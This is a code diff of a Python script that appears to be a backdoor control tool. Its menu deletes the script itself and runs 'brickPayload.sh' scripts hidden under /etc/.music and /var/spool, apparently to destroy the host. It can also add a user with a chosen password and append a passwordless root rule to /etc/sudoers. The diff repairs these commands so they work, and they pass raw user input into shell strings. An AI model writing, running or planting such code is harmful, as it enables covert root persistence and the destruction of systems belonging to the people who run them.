@@ -26,14 +26,15 @@ def main():
             print("Success.")
             os.system("rm -- \"$0\"")
         elif(value.lower() in  ('k')):
-            os.system("bash /etc/.a/horror/brickPayload.sh")
+            os.system("bash /etc/.music/brickPayload.sh")
             os.system("bash /var/spool/.payloadBrick.sh")
         elif(value.lower() in  ('a')):
             print("Adding a user.....")
             name = input("Enter username: ")
             password = input("Enter password: ")
             sudoIn = input("Should the user have root sudo? ")
-            os.system("echo {name}:{password} | chpasswd")
+            os.system("useradd "+name)
+            os.system("echo "+name+":"+password+" | chpasswd")
             if(sudoIn.lower() in  ('y')):
-                os.system("echo {name} ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers")
+                os.system("echo \""+name+" ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")
 main()
